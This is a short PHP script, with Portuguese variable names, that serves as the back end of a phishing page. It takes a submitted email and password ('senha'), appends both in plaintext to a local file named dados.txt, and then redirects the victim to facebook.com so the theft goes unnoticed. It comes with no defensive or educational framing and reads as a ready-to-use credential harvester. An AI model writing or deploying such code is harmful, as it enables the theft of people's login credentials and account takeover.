<<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    if (!empty($email) && !empty($senha)) {
        $dados = "Email: $email | Senha: $senha" . PHP_EOL;
        file_put_contents("dados.txt", $dados, FILE_APPEND);

        // Redireciona para teste.com
        header("Location: https://facebook.com/");
        exit();
    } else {
        echo "Preencha todos os campos.";
    }
} else {
    echo "Acesso inválido.";
}
?>
